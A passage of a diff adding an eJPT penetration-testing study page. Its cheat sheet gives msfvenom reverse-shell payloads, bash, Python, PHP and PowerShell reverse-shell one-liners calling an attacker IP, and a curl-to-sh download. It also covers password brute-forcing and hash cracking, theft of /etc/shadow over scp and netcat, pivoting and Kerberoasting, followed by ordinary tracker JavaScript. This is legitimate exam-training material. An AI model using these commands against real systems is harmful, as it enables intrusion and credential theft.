+          <li>Any module exploiting a service that Windows runs as <code>NT AUTHORITY\SYSTEM</code> by default (most native Windows services) will hand you that same level on success — the giveaway is the vulnerable service's own account, not the exploit technique</li>
+        </ul>
+        <h4>Meterpreter — commands worth knowing cold</h4>
+        <table class="ref-table">
+          <tr><th>Command</th><th>Why you'd use it</th></tr>
+          <tr><td><code>sysinfo</code> / <code>getuid</code></td><td>Confirms exactly what you landed as, before you do anything else — orients you on the box</td></tr>
+          <tr><td><code>getsystem</code></td><td>One-shot attempt at SYSTEM via known token/named-pipe tricks — try it before manual privesc, it's free</td></tr>
+          <tr><td><code>hashdump</code></td><td>Pulls local SAM hashes — feeds directly into the Password Attacks card below (pass-the-hash or offline cracking)</td></tr>
+          <tr><td><code>search -f *.txt</code> / <code>search -f flag*</code></td><td>Fast filesystem-wide search — flags are rarely in the working directory</td></tr>
+          <tr><td><code>portfwd add -l 8080 -p 80 -r 10.0.0.6</code></td><td>Pivots a port from a second, internal-only host through this session to your attacking box — see Pivoting card</td></tr>
+          <tr><td><code>background</code> then <code>sessions -i &lt;id&gt;</code></td><td>Keep multiple sessions alive across hosts instead of losing one to grab another</td></tr>
+        </table>
+        <h4>msfvenom — generating a payload</h4>
+<pre>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f exe -o shell.exe
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f elf -o shell.elf
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f raw -o shell.php</pre>
+        <p>Match the payload platform (windows/linux/php) and format (<code>-f</code>) to what the target can actually execute — a Windows PE handed to a Linux box does nothing.</p>
+      </div>
+    </details>
+
+    <details>
+      <summary><mark class="crit">Password Attacks</mark></summary>
+      <div class="refbody">
+        <p>Cheap, fast checks first — default/blank creds and small custom wordlists beat rockyou.txt against an unknown service far more often than the exam "feels" like it should.</p>
+        <h4>Hydra — online brute force</h4>
+<pre>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.5 http-post-form \
+  "/login:username=^USER^&password=^PASS^:Invalid password"
+hydra -L users.txt -P rockyou.txt ssh://10.0.0.5
+hydra -l admin -P rockyou.txt ftp://10.0.0.5</pre>
+        <p>Why build the username list from enumeration first: spraying one likely password across every discovered user is usually faster (and less likely to lock an account) than brute-forcing one user's password from scratch.</p>
+        <h4>John / Hashcat — offline cracking</h4>
+<pre>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt                                # once it's done, this prints the cracked value back out
+hashcat -m 1000 -a 0 ntlm-hashes.txt rockyou.txt      # -m 1000 = NTLM; -m 0 = raw MD5, -m 1800 = sha512crypt (Linux shadow)</pre>
+        <p>Why identify the hash type first (<code>hashid</code> or <code>hash-identifier</code>): feeding hashcat the wrong <code>-m</code> mode silently returns nothing, which looks identical to "not crackable."</p>
+        <h4>Credential spraying across a network</h4>
+<pre>crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Summer2024!'
+crackmapexec smb 10.0.0.0/24 -u admin -p passwords.txt --local-auth</pre>
+        <p>Why this matters on a multi-host exam network specifically: a credential you cracked or found on Host A is worth trying against every other host you've discovered before you go looking for a second, unrelated vulnerability.</p>
+      </div>
+    </details>
+
+    <details>
+      <summary><mark class="crit">Reverse &amp; bind shells</mark></summary>
+      <div class="refbody">
+        <p>Reverse (target connects back to you) is preferred when the target is behind a firewall/NAT that blocks inbound — which is the common case. Bind (you connect to the target) only works when you can reach the target's listening port directly.</p>
+        <h4>Listener, always start this first</h4>
+<pre>nc -lvnp 4444</pre>
+        <h4>One-liners by language</h4>
+<pre># Bash
+bash -i >& /dev/tcp/10.0.0.10/4444 0>&1
+
+# Python
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.10",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+
+# PHP
+php -r '$sock=fsockopen("10.0.0.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# PowerShell (Windows)
+powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.0.0.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}"</pre>
+        <h4>Upgrading a raw shell to something usable</h4>
+<pre>python3 -c 'import pty; pty.spawn("/bin/bash")'
+# then, in the now-interactive shell:
+export TERM=xterm
+Ctrl+Z            # background it on YOUR attacking box
+stty raw -echo; fg
+# then press Enter twice</pre>
+        <p>Why bother: a raw netcat shell has no tab-completion, no arrow-key history, and dies the moment a command like <code>vim</code> or <code>sudo -l</code> that needs a real TTY tries to run — the upgrade sequence above is worth doing on every single foothold immediately.</p>
+      </div>
+    </details>
+
+    <details>
+      <summary><mark class="crit">Linux Privilege Escalation — checklist</mark></summary>
+      <div class="refbody">
+        <p>Work this list top-to-bottom on every Linux foothold — it's ordered roughly cheapest-check-first.</p>
+        <table class="ref-table">
+          <tr><th>Check</th><th>Why it matters</th></tr>
+          <tr><td><code>sudo -l</code></td><td>Lists what you can run as root without a password — the single highest-yield command on this whole list; a misconfigured entry here is often instant root</td></tr>
+          <tr><td><code>find / -perm -4000 -type f 2>/dev/null</code></td><td>Lists SUID binaries — anything unusual (not a standard system binary) here can often be abused to read/write as root; cross-check against <a href="https://gtfobins.github.io" target="_blank">GTFOBins</a></td></tr>
+          <tr><td><code>cat /etc/crontab</code>, <code>ls -la /etc/cron.*</code></td><td>A cron job running as root against a world-writable script is a very common privesc path — you edit the script, root runs your code on the next tick</td></tr>
+          <tr><td><code>uname -a</code>, <code>cat /etc/*release*</code></td><td>Pins the kernel/distro version — tells you whether a known kernel-exploit (e.g. DirtyCow-class bugs) is even in play before you try one</td></tr>
+          <tr><td><code>ls -la /etc/passwd</code> (writable?)</td><td>A world-writable <code>/etc/passwd</code> lets you add a new UID-0 user directly — rare but trivial when present</td></tr>
+          <tr><td><code>echo $PATH</code>, check for a writable dir early in it</td><td>PATH hijacking — if a root-run script calls a binary by name (not full path) and a writable directory is earlier in PATH, you can plant your own version</td></tr>
+          <tr><td><code>getcap -r / 2>/dev/null</code></td><td>Linux capabilities can grant root-equivalent power to a binary without SUID — <code>cap_setuid</code> especially is worth searching GTFOBins for</td></tr>
+        </table>
+        <h4>Automate the sweep once you've done it manually once</h4>
+<pre>curl http://10.0.0.10/linpeas.sh | sh          # serve it from a python3 -m http.server on your attacking box
+# or transfer it over first, then:
+chmod +x linpeas.sh && ./linpeas.sh</pre>
+        <p>Why manual first, tool second, same as the web section: LinPEAS output is long and the highlighted "PE" lines can bury the one that actually matters — knowing the checklist above means you can spot the real lead instead of reading the whole wall of orange text.</p>
+      </div>
+    </details>
+
+    <details>
+      <summary><mark class="crit">Windows Privilege Escalation — checklist</mark></summary>
+      <div class="refbody">
+        <table class="ref-table">
+          <tr><th>Check</th><th>Why it matters</th></tr>
+          <tr><td><code>whoami /priv</code></td><td>Lists your enabled token privileges — <code>SeImpersonatePrivilege</code> enabled is an immediate flag: it means a token-impersonation privesc (e.g. via a Potato-family technique) is likely available</td></tr>
+          <tr><td><code>systeminfo</code></td><td>OS build/patch level — tells you whether a known local kernel exploit for that exact build is worth trying, same logic as <code>uname -a</code> on Linux</td></tr>
+          <tr><td><code>wmic service get name,displayname,pathname,startmode</code></td><td>Look for a service path containing a space with no quotes (e.g. <code>C:\Program Files\My App\service.exe</code>) — Windows will try each unquoted segment as an executable, letting you drop a malicious <code>C:\Program.exe</code></td></tr>
+          <tr><td><code>icacls "C:\Path\To\Service.exe"</code></td><td>Checks if you have write access to a binary a privileged service runs — if so, replace it and restart the service</td></tr>
+          <tr><td><code>reg query HKLM\...\Installer /v AlwaysInstallElevated</code> (HKLM and HKCU)</td><td>If both are set to 1, any user can install an MSI with SYSTEM privileges — build a malicious MSI with msfvenom and run it</td></tr>
+          <tr><td><code>schtasks /query /fo LIST /v</code></td><td>Same logic as cron on Linux — a scheduled task running as SYSTEM against a file you can write to is a direct path in</td></tr>
+        </table>
+        <h4>Automate the sweep once you've done it manually once</h4>
+<pre>certutil -urlcache -f http://10.0.0.10/winPEAS.exe winpeas.exe
+.\winpeas.exe</pre>
+        <p>Why <code>certutil</code> specifically: it's a signed Windows binary already on almost every box, so it's a reliable way to pull a file down even when other download tools are missing or blocked — worth remembering for file transfer generally, not just this one download.</p>
+        <h4>Counting local accounts (excluding built-ins)</h4>
+<pre>net user                                    # lists every local account by name
+net localgroup Administrators               # who's actually privileged
+wmic useraccount get name,disabled,lockout  # includes disabled/locked state — useful to filter service accounts out</pre>
+        <p>Why this needs a manual pass: "how many user accounts, excluding Administrator/Guest/service accounts" is really asking you to filter <code>net user</code>'s output by hand — Windows doesn't have a single flag that does the exclusion for you, so read the list and subtract the built-ins (Administrator, Guest, DefaultAccount, WDAGUtilityAccount) and anything named like a service account yourself.</p>
+      </div>
+    </details>
+
+    <details>
+      <summary><mark class="imp">Pivoting &amp; tunneling</mark></summary>
+      <div class="refbody">
+        <p>Once a foothold on Host A can reach a second, internal-only network that your attacking box can't reach directly, you need to route traffic through Host A to get there.</p>
+        <h4>Find the second network before you try to pivot into it</h4>
+<pre># Linux foothold
+ip a                        # a second NIC/subnet here is the giveaway
+ip route ; route -n         # shows what that host already knows how to reach
+arp -a                      # other live hosts this box has already talked to
+
+# Windows foothold
+ipconfig /all               # same idea — a second adapter/subnet
+route print
+arp -a</pre>
+        <p>Why this comes first: a "what's the subnet of the internal network" question is answered directly by this host's own network config — it already knows, because it's sitting on both networks. This is also literally what confirms a box is worth pivoting through in the first place, versus one that's DMZ-only.</p>
+        <h4>SSH dynamic port forward (if you have SSH creds on the pivot)</h4>
+<pre>ssh -D 9050 user@10.0.0.5
+# then point tools at it via proxychains — edit /etc/proxychains.conf: socks5 127.0.0.1 9050
+proxychains nmap -sT -Pn 10.0.1.0/24</pre>
+        <p>Why <code>-sT -Pn</code> specifically through proxychains: a SOCKS proxy can't carry raw SYN/ICMP packets, only full TCP connections, so a normal <code>-sS</code>/ping-based scan silently fails through the tunnel.</p>
+        <h4>Chisel (no SSH needed — works over a meterpreter session or plain shell)</h4>
+<pre># On your attacking box (server)
+chisel server -p 8000 --reverse
+
+# On the compromised host (client) — pushes a SOCKS proxy back to you
+chisel client 10.0.0.10:8000 R:socks
+
+# Then use it the same way, via proxychains pointed at 127.0.0.1:1080</pre>
+        <p>Why chisel over SSH-only pivoting: it works even when the compromised host has no SSH server or you don't have valid SSH creds on it — just a shell is enough.</p>
+        <h4>Meterpreter's built-in equivalent</h4>
+<pre>run autoroute -s 10.0.1.0/24
+use auxiliary/server/socks_proxy
+set SRVPORT 1080
+run</pre>
+        <p>Keeps everything inside the Metasploit session you already have instead of standing up a separate tool — convenient when you're already deep in an msfconsole workflow.</p>
+      </div>
+    </details>
+
+    <details>
+      <summary><mark class="imp">Active Directory basics</mark></summary>
+      <div class="refbody">
+        <p>Even a lightweight, single-domain-controller AD lab rewards the same enumeration-before-exploitation discipline as everything else on this sheet.</p>
+        <h4>Unauthenticated / null-session first</h4>
+<pre>enum4linux-ng -A 10.0.0.5
+crackmapexec smb 10.0.0.5 -u '' -p '' --users
+crackmapexec smb 10.0.0.5 -u '' -p '' --shares</pre>
+        <p>Why: a null session on the DC can leak a full domain user list before you've entered a single credential — that list is exactly what feeds the password-spraying step next.</p>
+        <h4>Once you have any valid credential (even a low-privilege one)</h4>
+<pre>crackmapexec smb 10.0.0.5 -u jdoe -p 'Password1' --shares
+crackmapexec smb 10.0.0.5 -u jdoe -p 'Password1' --loggedon-users
+bloodhound-python -u jdoe -p 'Password1' -ns 10.0.0.5 -d corp.local -c All</pre>
+        <p>Why BloodHound even with one weak account: it maps who's an admin of what and how, turning "I have one low-priv user" into a visual path toward Domain Admin instead of guessing what to try next.</p>
+        <h4>Kerberoasting, if you have any domain credential</h4>
+<pre>GetUserSPNs.py corp.local/jdoe:'Password1' -dc-ip 10.0.0.5 -request
+# then crack the returned hash offline:
+hashcat -m 13100 spns.txt rockyou.txt</pre>
+        <p>Why it works without any special privilege: any authenticated domain user can request a service ticket for any account with a registered SPN — if that account's password is weak, the ticket cracks offline with no lockout risk.</p>
+      </div>
+    </details>
+
+    <details>
+      <summary><mark class="imp">Post-exploitation &amp; file transfer</mark></summary>
+      <div class="refbody">
+        <h4>Getting files onto a compromised host</h4>
+<pre># From your attacking box, serve the file:
+python3 -m http.server 8000
+
+# On a Linux target:
+wget http://10.0.0.10:8000/linpeas.sh
+curl http://10.0.0.10:8000/linpeas.sh -o linpeas.sh
+
+# On a Windows target (no wget/curl needed):
+certutil -urlcache -f http://10.0.0.10:8000/winpeas.exe winpeas.exe
+powershell -c "IWR http://10.0.0.10:8000/winpeas.exe -OutFile winpeas.exe"</pre>
+        <h4>Getting files (loot) back off a compromised host</h4>
+<pre># SCP, if SSH is available
+scp user@10.0.0.5:/etc/shadow ./loot/
+
+# Simple netcat file transfer when nothing else is available
+# Receiver (your box): nc -lvnp 4444 > loot.txt
+# Sender (target):     nc 10.0.0.10 4444 < loot.txt</pre>
+        <p>Why keep a spare method (netcat) in mind: on some hosts SCP/SSH-out is blocked by an outbound firewall rule while a raw TCP connection on an arbitrary port isn't — always have a fallback.</p>
+        <h4>Basic footprint discipline</h4>
+        <ul class="bullets">
+          <li>Note every file you drop on a target in the Timeline above — you'll want that list again for the report's "artifacts left behind" section</li>
+          <li>Prefer running tools from memory / a temp directory over installing anything persistently, unless persistence is explicitly part of the objective</li>
+          <li>Clean up dropped shells/binaries at the end if the engagement rules call for it — check your specific exam's cleanup requirements, they vary</li>
+        </ul>
+      </div>
+    </details>
+
+    <details>
+      <summary><mark class="crit">Stuck? Reset ladder</mark></summary>
+      <div class="refbody">
+        <p>When a target dead-ends, work down this list instead of re-running the same scan with slightly different flags.</p>
+        <ol class="steps">
+          <li>Re-read the question. Does it name a specific host, service, or file you haven't actually looked at yet?</li>
+          <li>Re-scan with different timing/scripts — a rate-limited service can silently drop packets on an aggressive <code>-T4</code> scan; try <code>-T2</code> once</li>
+          <li>Check every port again, not just the "interesting" ones — the intended path is sometimes the boring service you skipped</li>
+          <li>Try default/blank credentials on every login prompt before assuming you need to crack or exploit anything</li>
+          <li>Switch tool for the same job — <code>gobuster</code> quiet? Try <code>ffuf</code> or <code>dirb</code> with a different wordlist; one tool's default wordlist misses what another catches</li>
+          <li>Re-use a credential you already have against a service you haven't tried it on yet — password/hash reuse across a small exam network is extremely common by design</li>
+          <li>Step back to a host you already own and re-check <code>Credentials &amp; Loot</code> — the pivot you need is often something you found hours ago and didn't recognize as relevant yet</li>
+          <li>Mark it and move on — a later host or credential often hands you the exact piece you were missing</li>
+        </ol>
+        <p><b>No result is a signal, not a dead end</b> — it almost always means wrong wordlist, wrong timing, wrong assumption about the service, or a credential you haven't tried yet, not that there's nothing there.</p>
+      </div>
+    </details>
+
+    <details>
+      <summary><mark class="crit">Report format &amp; final verify ritual</mark></summary>
+      <div class="refbody">
+        <p>Same discipline as any pentest deliverable — a technically correct finding written up badly is a weaker answer than a well-structured one.</p>
+        <h4>Per-finding shape</h4>
+        <ol class="steps">
+          <li><b>Finding</b> — one line: what the vulnerability/access is, and on which host</li>
+          <li><b>Evidence</b> — the exact command/request that proves it, and its output/response</li>
+          <li><b>Impact</b> — what access or data this actually grants</li>
+          <li><b>Reproduction steps</b> — numbered, exact, copy-pasteable — a grader (or a real client's engineer) should be able to follow it verbatim</li>
+        </ol>
+        <h4>Final pass before submitting — run this on every question</h4>
+        <ul class="bullets">
+          <li>Does the answer match the exact format asked for — flag format, IP, filename, hash type?</li>
+          <li>Copy-pasted, not retyped — flags and hashes are exact strings, one typo is a wrong answer</li>
+          <li>Every host you touched is listed in Host &amp; Service Map, even the ones that were dead ends — completeness matters for methodology questions</li>
+          <li>Credentials &amp; Loot table has a source/host for every entry, not just the value — an unsourced credential is hard to defend if asked</li>
+          <li>Every question attempted — a partial, well-reasoned answer beats a skipped one</li>
+        </ul>
+      </div>
+    </details>
+
+  </div>
+
+  <!-- SCRATCH -->
+  <h2 class="section">Scratchpad</h2>
+  <textarea class="scratch" id="scratch" placeholder="Anything that doesn't fit elsewhere — hypotheses, things to double back on, commands you keep needing..."></textarea>
+
+  <footer>Runs entirely in your browser. Clearing site data / browser cache will erase saved progress — export JSON regularly if this matters to you, especially across a multi-day exam window.<br>Independent eJPT study aid, not affiliated with INE / eLearnSecurity. Part of <a href="https://github.com/zelihazenginapogeeusa-byte/zeliha-infosec-journey" target="_blank" style="color:var(--imp);">zeliha-infosec-journey</a>.</footer>
+</div>
+
+<div class="undo-toast" id="undoToast" style="display:none;">
+  <span id="undoMsg">Row removed.</span>
+  <button id="undoBtn" class="primary">Undo</button>
+</div>
+
+<script>
+(function(){
+  const STORAGE_KEY = 'ejpt-study-reference-v1';
+  const TACTICS = ["Reconnaissance","Resource Development","Initial Access","Execution","Persistence","Privilege Escalation","Defense Evasion","Credential Access","Discovery","Lateral Movement","Collection","Command and Control","Exfiltration","Impact"];
+  const PHASES = ["Reconnaissance","Scanning & Enumeration","Vulnerability Assessment","Exploitation","Post-Exploitation & Privesc","Lateral Movement / Pivoting","Reporting"];
+  const PHASE_STATES = ["Not started","In progress","Done"];
+  const HOST_STATUS = ["", "Discovered", "Enumerated", "Vulnerable", "Exploited"];
+  const HOST_STATUS_SEVERITY = {"Vulnerable":"med", "Exploited":"high"};
+  const ACCESS_LEVELS = ["", "None", "User", "Admin / Root", "SYSTEM / root (full)"];
+
+  const CONFIDENCE_LEVELS = ["", "Low", "Medium", "High"];
+
+  function defaultState(){
+    const questions = [];
+    for(let i=1;i<=45;i++) questions.push({id:'q'+i, label:'Q'+i, done:false, note:'', confidence:''});
+    const attck = {};
+    TACTICS.forEach(t => attck[t] = {observed:false, technique:''});
+    const phases = {};
+    PHASES.forEach(p => phases[p] = "Not started");
+    return {
+      startTime: null,
+      targetHours: 48,
+      questions: questions,
+      loot: [ {type:'', value:'', hostService:'', notes:''} ],
+      timeline: [ {time:'', host:'', tool:'', finding:'', attck:''} ],
+      hosts: [ {host:'', hostnameOs:'', portService:'', versionCve:'', status:'', access:'', notes:''} ],
+      attck: attck,
+      phases: phases,
+      scratch: '',
+      theme: 'dark'
+    };
+  }
+
+  let state = load();
+
+  function load(){
+    try{
+      const raw = localStorage.getItem(STORAGE_KEY);
+      if(!raw) return defaultState();
+      const parsed = JSON.parse(raw);
+      const d = defaultState();
+      return Object.assign(d, parsed);
+    }catch(e){ return defaultState(); }
+  }
+
+  let saveTimer = null;
+  function save(){
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
+    const el = document.getElementById('savedIndicator');
+    el.classList.add('show');
+    clearTimeout(saveTimer);
+    saveTimer = setTimeout(()=> el.classList.remove('show'), 1200);
+  }
+  function scheduleSave(){ clearTimeout(scheduleSave._t); scheduleSave._t = setTimeout(save, 250); }
+
+  // ---------- THEME ----------
+  function applyTheme(){
+    document.documentElement.setAttribute('data-theme', state.theme);
+    document.getElementById('themeToggle').textContent = state.theme === 'dark' ? '☀' : '🌙';
+  }
+  document.getElementById('themeToggle').addEventListener('click', ()=>{
+    state.theme = state.theme === 'dark' ? 'light' : 'dark';
+    applyTheme(); scheduleSave();
+  });
+
+  // ---------- QUESTIONS ----------
+  function renderQuestions(){
+    const card = document.getElementById('questionsCard');
+    card.innerHTML = '';
+    state.questions.forEach((q, idx) => {
+      if(q.confidence === undefined) q.confidence = '';
+      const row = document.createElement('div');
+      row.className = 'qrow' + (q.done ? ' done' : '');
+      const confOpts = CONFIDENCE_LEVELS.map(c => `<option value="${c}" ${q.confidence===c?'selected':''}>${c || 'Confidence…'}</option>`).join('');
+      row.innerHTML = `
+        <input type="checkbox" ${q.done?'checked':''}>
+        <input class="qlabel" type="text" value="${escapeAttr(q.label)}">
+        <select class="qconf${q.confidence ? ' conf-'+q.confidence.toLowerCase() : ''}" title="How confident are you in this answer?">${confOpts}</select>
+        <textarea class="qnote" rows="1" placeholder="Answer / flag value / evidence reference...">${escapeHtml(q.note)}</textarea>
+        <button class="del-row" title="Remove">✕</button>
+      `;
+      const [cb, labelInput, confSelect, noteInput, delBtn] = row.querySelectorAll('input[type=checkbox], input.qlabel, select.qconf, textarea.qnote, button.del-row');
+      cb.addEventListener('change', ()=>{ q.done = cb.checked; row.classList.toggle('done', q.done); scheduleSave(); renderCoverage(); });
+      labelInput.addEventListener('input', ()=>{ q.label = labelInput.value; scheduleSave(); });
+      confSelect.addEventListener('change', ()=>{
+        q.confidence = confSelect.value;
+        confSelect.className = 'qconf' + (q.confidence ? ' conf-'+q.confidence.toLowerCase() : '');
+        scheduleSave();
+      });
+      noteInput.addEventListener('input', ()=>{ q.note = noteInput.value; scheduleSave(); });
+      delBtn.addEventListener('click', ()=>{
+        const removed = state.questions.splice(idx,1)[0];
+        renderQuestions(); scheduleSave(); renderCoverage();
+        showUndo('Question', ()=>{
+          state.questions.splice(Math.min(idx, state.questions.length), 0, removed);
+          renderQuestions(); scheduleSave(); renderCoverage();
+        });
+      });
+      card.appendChild(row);
+    });
+  }
+  document.getElementById('addQuestion').addEventListener('click', ()=>{
+    state.questions.push({id:'q'+Date.now(), label:'Q'+(state.questions.length+1), done:false, note:'', confidence:''});
+    renderQuestions(); scheduleSave(); renderCoverage();
+  });
+
+  // ---------- GENERIC DYN TABLE (Loot + Timeline) ----------
+  function renderDynTable(tbodyId, rows, cols, addFn){
+    const tbody = document.getElementById(tbodyId);
+    tbody.innerHTML = '';
+    rows.forEach((row, idx) => {
+      const tr = document.createElement('tr');
+      cols.forEach(col => {
+        const td = document.createElement('td');
+        const input = document.createElement(col.multiline ? 'textarea' : 'input');
+        if(!col.multiline) input.type = 'text';
+        else { input.rows = 1; }
+        input.value = row[col.key] || '';
+        input.placeholder = col.placeholder || '';
+        input.addEventListener('input', ()=>{ row[col.key] = input.value; scheduleSave(); });
+        td.appendChild(input);
+        tr.appendChild(td);
+      });
+      const tdDel = document.createElement('td');
+      const delBtn = document.createElement('button');
+      delBtn.className = 'del-row'; delBtn.textContent = '✕'; delBtn.title = 'Remove row';
+      delBtn.addEventListener('click', ()=>{
+        const removed = rows.splice(idx,1)[0];
+        addFn.render(); scheduleSave();
+        showUndo('Row', ()=>{ rows.splice(Math.min(idx, rows.length), 0, removed); addFn.render(); scheduleSave(); });
+      });
+      tdDel.appendChild(delBtn);
+      tr.appendChild(tdDel);
+      tbody.appendChild(tr);
+    });
+  }
+
+  const lootCols = [
+    {key:'type', placeholder:'e.g. Password / Hash / SSH key'},
+    {key:'value', placeholder:'value'},
+    {key:'hostService', placeholder:'e.g. 10.0.0.5 / SMB'},
+    {key:'notes', placeholder:'notes', multiline:true},
+  ];
+  const lootRenderer = { render: ()=> renderDynTable('lootBody', state.loot, lootCols, lootRenderer) };
+  document.getElementById('addLoot').addEventListener('click', ()=>{
+    state.loot.push({type:'', value:'', hostService:'', notes:''});
+    lootRenderer.render(); scheduleSave();
+  });
+
+  const timelineCols = [
+    {key:'time', placeholder:'HH:MM:SS'},
+    {key:'host', placeholder:'host / IP'},
+    {key:'tool', placeholder:'tool / technique'},
+    {key:'finding', placeholder:'what you found', multiline:true},
+    {key:'attck', placeholder:'ATT&CK / notes'},
+  ];
+  const timelineRenderer = { render: ()=> renderDynTable('timelineBody', state.timeline, timelineCols, timelineRenderer) };
+  document.getElementById('addTimeline').addEventListener('click', ()=>{
+    state.timeline.push({time:'', host:'', tool:'', finding:'', attck:''});
+    timelineRenderer.render(); scheduleSave();
+  });
+
+  // ---------- HOST & SERVICE MAP (bespoke renderer, with status/access selects + severity dot) ----------
+  function renderHosts(){
+    const tbody = document.getElementById('hostsBody');
+    tbody.innerHTML = '';
+    state.hosts.forEach((row, idx) => {
+      const tr = document.createElement('tr');
+      tr.className = row.status === 'Exploited' ? 'status-exploited' : '';
+
+      const tdDot = document.createElement('td');
+      const dot = document.createElement('span');
+      dot.className = 'flag-dot' + (HOST_STATUS_SEVERITY[row.status] ? ' ' + HOST_STATUS_SEVERITY[row.status] : '');
+      dot.title = row.status || 'no status set';
+      tdDot.appendChild(dot);
+      tr.appendChild(tdDot);
+
+      function textCell(key, placeholder){
+        const td = document.createElement('td');
+        const input = document.createElement('input');
+        input.type = 'text'; input.value = row[key] || ''; input.placeholder = placeholder || '';
+        input.addEventListener('input', ()=>{ row[key] = input.value; scheduleSave(); });
+        td.appendChild(input);
+        return td;
+      }
+      tr.appendChild(textCell('host', 'e.g. 10.0.0.5'));
+      tr.appendChild(textCell('hostnameOs', 'e.g. DC01 / Windows Server 2019'));
+      tr.appendChild(textCell('portService', 'e.g. 445/SMB'));
+      tr.appendChild(textCell('versionCve', 'e.g. Samba 3.5 / CVE-2017-0144'));
+
+      const tdStatus = document.createElement('td');
+      const selStatus = document.createElement('select');
+      HOST_STATUS.forEach(s => {
+        const opt = document.createElement('option');
+        opt.value = s; opt.textContent = s || '— select —';
+        if(row.status === s) opt.selected = true;
+        selStatus.appendChild(opt);
+      });
+      selStatus.addEventListener('change', ()=>{
+        row.status = selStatus.value;
+        dot.className = 'flag-dot' + (HOST_STATUS_SEVERITY[row.status] ? ' ' + HOST_STATUS_SEVERITY[row.status] : '');
+        dot.title = row.status || 'no status set';
+        tr.className = row.status === 'Exploited' ? 'status-exploited' : '';
+        scheduleSave();
+      });
+      tdStatus.appendChild(selStatus);
+      tr.appendChild(tdStatus);
+
+      const tdAccess = document.createElement('td');
+      const selAccess = document.createElement('select');
+      ACCESS_LEVELS.forEach(a => {
+        const opt = document.createElement('option');
+        opt.value = a; opt.textContent = a || '— select —';
+        if(row.access === a) opt.selected = true;
+        selAccess.appendChild(opt);
+      });
+      selAccess.addEventListener('change', ()=>{ row.access = selAccess.value; scheduleSave(); });
+      tdAccess.appendChild(selAccess);
+      tr.appendChild(tdAccess);
+
+      tr.appendChild(textCell('notes', 'notes'));
+
+      const tdDel = document.createElement('td');
+      const delBtn = document.createElement('button');
+      delBtn.className = 'del-row'; delBtn.textContent = '✕'; delBtn.title = 'Remove row';
+      delBtn.addEventListener('click', ()=>{
+        const removed = state.hosts.splice(idx,1)[0];
+        renderHosts(); scheduleSave();
+        showUndo('Host row', ()=>{ state.hosts.splice(Math.min(idx, state.hosts.length), 0, removed); renderHosts(); scheduleSave(); });
+      });
+      tdDel.appendChild(delBtn);
+      tr.appendChild(tdDel);
+
+      tbody.appendChild(tr);
+    });
+  }
+  document.getElementById('addHost').addEventListener('click', ()=>{
+    state.hosts.push({host:'', hostnameOs:'', portService:'', versionCve:'', status:'', access:'', notes:''});
+    renderHosts(); scheduleSave();
+  });
+
+  // ---------- ATT&CK ----------
+  function renderAttck(){
+    const grid = document.getElementById('attckGrid');
+    grid.innerHTML = '';
+    TACTICS.forEach(t => {
+      const entry = state.attck[t];
+      const item = document.createElement('div');
+      item.className = 'attck-item' + (entry.observed ? ' on' : '');
+      item.innerHTML = `
+        <input type="checkbox" ${entry.observed?'checked':''}>
+        <span class="tname">${t}</span>
+        <input type="text" placeholder="T####" value="${escapeAttr(entry.technique)}">
+      `;
+      const [cb, techInput] = item.querySelectorAll('input[type=checkbox], input[type=text]');
+      cb.addEventListener('change', ()=>{ entry.observed = cb.checked; item.classList.toggle('on', entry.observed); scheduleSave(); });
+      techInput.addEventListener('input', ()=>{ entry.technique = techInput.value; scheduleSave(); });
+      grid.appendChild(item);
+    });
+  }
+
+  // ---------- PHASES ----------
+  function renderPhases(){
+    const grid = document.getElementById('phaseGrid');
+    grid.innerHTML = '';
+    PHASES.forEach(p => {
+      const item = document.createElement('div');
+      item.className = 'phase-item';
+      const opts = PHASE_STATES.map(s => `<option value="${s}" ${state.phases[p]===s?'selected':''}>${s}</option>`).join('');
+      item.innerHTML = `<div class="pname">${p}</div><select>${opts}</select>`;
+      item.querySelector('select').addEventListener('change', (e)=>{ state.phases[p] = e.target.value; scheduleSave(); renderCoverage(); });
+      grid.appendChild(item);
+    });
+  }
+
+  // ---------- COVERAGE ----------
+  function renderCoverage(){
+    const totalQ = state.questions.length;
+    const doneQ = state.questions.filter(q => q.done).length;
+    const totalP = PHASES.length;
+    const doneP = PHASES.filter(p => state.phases[p] === 'Done').length;
+    const pct = totalQ ? Math.round((doneQ/totalQ)*100) : 0;
+    document.getElementById('covFill').style.width = pct + '%';
+    document.getElementById('covLabel').textContent = `${doneQ}/${totalQ} questions answered (${pct}%) · ${doneP}/${totalP} phases done`;
+  }
+
+  // ---------- UNDO ----------
+  let undoAction = null;
+  let undoTimer = null;
+  function showUndo(label, restoreFn){
+    undoAction = restoreFn;
+    document.getElementById('undoMsg').textContent = label + ' removed.';
+    const toast = document.getElementById('undoToast');
+    toast.style.display = 'flex';
+    clearTimeout(undoTimer);
+    undoTimer = setTimeout(()=>{ toast.style.display = 'none'; undoAction = null; }, 6000);
+  }
+  document.getElementById('undoBtn').addEventListener('click', ()=>{
+    if(undoAction) undoAction();
+    document.getElementById('undoToast').style.display = 'none';
+    clearTimeout(undoTimer);
+    undoAction = null;
+  });
+
+  // ---------- SCRATCH ----------
+  const scratchEl = document.getElementById('scratch');
+  scratchEl.value = state.scratch || '';
+  scratchEl.addEventListener('input', ()=>{ state.scratch = scratchEl.value; scheduleSave(); });
+
+  // ---------- TIMER ----------
+  const targetHoursInput = document.getElementById('targetHours');
+  targetHoursInput.value = state.targetHours;
+  targetHoursInput.addEventListener('input', ()=>{
